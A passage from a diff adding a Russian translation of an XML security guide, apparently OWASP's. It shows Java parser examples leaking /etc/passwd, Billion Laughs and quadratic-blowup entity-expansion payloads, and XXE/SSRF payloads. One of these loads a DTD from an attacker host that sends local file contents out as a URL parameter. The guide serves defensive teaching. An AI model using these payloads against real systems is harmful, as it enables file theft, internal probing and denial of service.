+<span class="w">    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Предыдущий код выводит следующее:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>javac<span class="w"> </span>parseDocument.java<span class="w"> </span><span class="p">;</span><span class="w"> </span>java<span class="w"> </span>parseDocument
+First<span class="w"> </span>Name:<span class="w"> </span>John
+Last<span class="w"> </span>Name:<span class="w"> </span><span class="c1">### User Database</span>
+...
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
+</code></pre></div>
+<h5 id="xxe-dom4j">XXE с использованием DOM4J<a class="headerlink" href="#xxe-dom4j" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.Document</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.DocumentException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.SAXReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.OutputFormat</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.XMLWriter</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test1</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">Document</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">SAXReader</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXReader</span><span class="p">();</span>
+<span class="w">   </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reader</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">OutputFormat</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OutputFormat</span><span class="p">.</span><span class="na">createPrettyPrint</span><span class="p">();</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">XMLWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLWriter</span><span class="p">(</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">,</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="p">);</span>
+<span class="w">   </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Предыдущий код выводит следующее:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>test1
+&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
+&lt;!DOCTYPE<span class="w"> </span>contacts<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;contacts.dtd&quot;</span>&gt;
+
+&lt;contacts&gt;
+<span class="w"> </span>&lt;contact&gt;
+<span class="w">  </span>&lt;firstname&gt;John&lt;/firstname&gt;
+<span class="w">  </span>&lt;lastname&gt;###<span class="w"> </span>User<span class="w"> </span>Database
+...
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
+</code></pre></div>
+<h5 id="xxe-sax">XXE с использованием SAX<a class="headerlink" href="#xxe-sax" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParser</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.SAXException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">DefaultHandler</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">new</span><span class="w"> </span><span class="n">parseDocument</span><span class="p">();</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="nf">parseDocument</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">SAXParserFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAXParserFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">   </span><span class="n">SAXParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span>
+<span class="w">   </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="w"> </span><span class="nd">@Override</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">characters</span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SAXException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">tmpValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">);</span>
+<span class="w">  </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">tmpValue</span><span class="p">);</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Предыдущий код выводит следующее:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>parseDocument
+John
+<span class="c1">#### User Database</span>
+...
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
+</code></pre></div>
+<h5 id="xxe-stax">XXE с использованием StAX<a class="headerlink" href="#xxe-stax" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLStreamReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLInputFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">XMLInputFactory</span><span class="w"> </span><span class="n">xmlif</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">   </span><span class="n">FileReader</span><span class="w"> </span><span class="n">fr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
+<span class="w">   </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
+<span class="w">   </span><span class="n">XMLStreamReader</span><span class="w"> </span><span class="n">xmlfer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlif</span><span class="p">.</span><span class="na">createXMLStreamReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span>
+<span class="w">                                            </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">file</span><span class="p">));</span>
+<span class="w">   </span><span class="kt">int</span><span class="w"> </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getEventType</span><span class="p">();</span>
+<span class="w">   </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">next</span><span class="p">();</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasText</span><span class="p">()){</span>
+<span class="w">     </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getText</span><span class="p">());</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">   </span><span class="p">}</span>
+<span class="w">   </span><span class="n">fr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Предыдущий код выводит следующее:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>parseDocument
+&lt;!DOCTYPE<span class="w"> </span>contacts<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;contacts.dtd&quot;</span>&gt;John###<span class="w"> </span>User<span class="w"> </span>Database
+...
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
+</code></pre></div>
+<h4 id="_28">Рекурсивная ссылка на сущность<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h4>
+<p><strong>Когда определение элемента <code>A</code> является другим элементом <code>B</code>, а элемент <code>B</code> определён как элемент <code>A</code>, схема описывает циклическую ссылку между элементами:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE A [</span>
+<span class="cp"> &lt;!ELEMENT A ANY&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY A &quot;&lt;A&gt;</span><span class="ni">&amp;B;</span><span class="nt">&lt;/A&gt;</span>&quot;&gt;
+<span class="w"> </span><span class="cp">&lt;!ENTITY B &quot;&amp;A;&quot;&gt;</span>
+]&gt;
+<span class="nt">&lt;A&gt;</span><span class="ni">&amp;A;</span><span class="nt">&lt;/A&gt;</span>
+</code></pre></div>
+<h4 id="_29">Квадратичное расширение<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h4>
+<p><strong>Вместо определения множества маленьких глубоко вложенных сущностей, злоумышленник в этом сценарии определяет одну очень большую сущность и ссылается на неё как можно больше раз, что приводит к квадратичному расширению (<em>O(n^2)</em>).</strong></p>
+<p>Результатом следующей атаки будет 100 000 × 100 000 символов в памяти.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY A &quot;AAAAA...(100.000 символов A)...AAAAA&quot;&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;</span>...(100.000<span class="w"> </span><span class="ni">&amp;A;</span>)...<span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<h4 id="billion-laughs">Billion Laughs<a class="headerlink" href="#billion-laughs" title="Permanent link">&para;</a></h4>
+<p><strong>Когда XML-парсер пытается разрешить внешние сущности из следующего кода, это заставит приложение потреблять всю доступную память до сбоя процесса.</strong> Вот пример XML-документа со встроенной схемой <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>, включающей атаку:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;LOL9;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<p>Сущность <code>LOL9</code> будет разрешена как 10 сущностей, определённых в <code>LOL8</code>; затем каждая из этих сущностей будет разрешена в <code>LOL7</code> и так далее. В итоге CPU и/или память пострадают от разбора <code>3 × 10^9</code> (3 000 000 000) сущностей, определённых в этой схеме, что может привести к сбою парсера.</p>
+<p><strong>Спецификация Simple Object Access Protocol (<a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a>) полностью запрещает <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Это означает, что SOAP-процессор может отвергать любое SOAP-сообщение, содержащее <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Несмотря на эту спецификацию, некоторые SOAP-реализации всё равно разбирали схемы <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> внутри SOAP-сообщений.</strong></p>
+<p>Следующий пример иллюстрирует случай, когда парсер не следует спецификации, допуская ссылку на <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> в SOAP-сообщении:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?XML VERSION=&quot;1.0&quot; ENCODING=&quot;UTF-8&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE SOAP-ENV:ENVELOPE [</span>
+<span class="cp"> &lt;!ELEMENT SOAP-ENV:ENVELOPE ANY&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
+]&gt;
+<span class="nt">&lt;SOAP:ENVELOPE</span><span class="w"> </span><span class="na">ENTITYREFERENCE=</span><span class="s">&quot;&amp;LOL9;&quot;</span>
+<span class="w">               </span><span class="na">XMLNS:SOAP=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;SOAP:BODY&gt;</span>
+<span class="w">  </span><span class="nt">&lt;KEYWORD</span><span class="w"> </span><span class="na">XMLNS=</span><span class="s">&quot;URN:PARASOFT:WS:STORE&quot;</span><span class="nt">&gt;</span>FOO<span class="nt">&lt;/KEYWORD&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/SOAP:BODY&gt;</span>
+<span class="nt">&lt;/SOAP:ENVELOPE&gt;</span>
+</code></pre></div>
+<h4 id="_30">Отражённое извлечение файлов<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h4>
+<p>Рассмотрим следующий пример кода XXE:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp"> &lt;!ELEMENT includeme ANY&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<p><strong>В предыдущем XML определяется сущность <code>xxe</code>, которая фактически является содержимым <code>/etc/passwd</code>, и она будет раскрыта внутри тега <code>includeme</code>. Если парсер разрешает ссылки на внешние сущности, он может включить содержимое этого файла в XML-ответ или в вывод ошибки.</strong></p>
+<h4 id="ssrf">Подделка запросов на стороне сервера (SSRF)<a class="headerlink" href="#ssrf" title="Permanent link">&para;</a></h4>
+<p><strong>Server Side Request Forgery (SSRF) происходит, когда сервер получает вредоносную XML-схему, заставляющую сервер получать удалённые ресурсы, например файл через HTTP/HTTPS/FTP и т.д.</strong> SSRF использовалась для получения удалённых файлов, для подтверждения XXE, когда нельзя отразить файл или выполнить сканирование портов, или для брутфорс-атак на внутренние сети.</p>
+<h5 id="dns">Внешнее разрешение DNS<a class="headerlink" href="#dns" title="Permanent link">&para;</a></h5>
+<p><strong>Иногда возможно заставить приложение выполнять DNS-запросы на стороне сервера для произвольных доменных имён.</strong> Это одна из простейших форм SSRF, требующая от злоумышленника анализа DNS-трафика. В Burp есть плагин, проверяющий наличие этой атаки.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE m PUBLIC &quot;-//B/A/EN&quot; &quot;http://checkforthisspecificdomain.example.com&quot;&gt;</span>
+</code></pre></div>
+<h5 id="_31">Внешнее соединение<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h5>
+<p>Когда есть XXE и нельзя получить файл, можно проверить возможность установления удалённых соединений:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp"> &lt;!ENTITY % xxe SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
+<span class="w"> </span>%xxe;
+]&gt;
+</code></pre></div>
+<h5 id="_32">Извлечение файлов с параметрическими сущностями<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h5>
+<p>Параметрические сущности позволяют получать содержимое с помощью URL-ссылок. Рассмотрим следующий вредоносный XML-документ:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp"> &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
+<span class="w"> </span>%dtd;
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<p>Здесь <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> определяет две внешние параметрические сущности: <code>file</code> загружает локальный файл, а <code>dtd</code> загружает удалённый <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Удалённый <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> должен содержать нечто подобное:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="cp">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://example.com/?%file;&#39;&gt;</span>&quot;&gt;
+%all;
+</code></pre></div>
+<p>Второй <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> заставляет систему отправлять содержимое файла обратно на сервер злоумышленника в качестве параметра URL.</p>
+<h5 id="_33">Сканирование портов<a class="headerlink" href="#_33" title="Permanent link">&para;</a></h5>
+<p>Количество и тип информации, генерируемой при сканировании портов, зависит от типа реализации. Ответы можно классифицировать следующим образом:</p>
+<p><strong>1) Полное раскрытие</strong>: Это простейший и наиболее нетипичный сценарий; при полном раскрытии можно чётко видеть, что происходит, получая полные ответы от опрашиваемого сервера. Вы получаете точное представление о том, что произошло при подключении к удалённому хосту.</p>
+<p><strong>2) Основанное на ошибках</strong>: Если нельзя увидеть ответ от удалённого сервера, можно использовать информацию, генерируемую ответом об ошибке. Рассмотрим веб-сервис, раскрывающий детали ошибки в элементе SOAP Fault при попытке установить соединение:</p>
+<div class="highlight"><pre><span></span><code>java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
+ at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
+ at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
+</code></pre></div>
+<p><strong>3) Основанное на тайм-аутах</strong>: Сканер может генерировать тайм-ауты при подключении к открытым или закрытым портам в зависимости от схемы и базовой реализации. Если тайм-ауты возникают при попытке подключиться к закрытому порту (что может занять одну минуту), время ответа при подключении к открытому порту будет очень быстрым (например, одна секунда). Разница между открытыми и закрытыми портами становится весьма очевидной.</p>
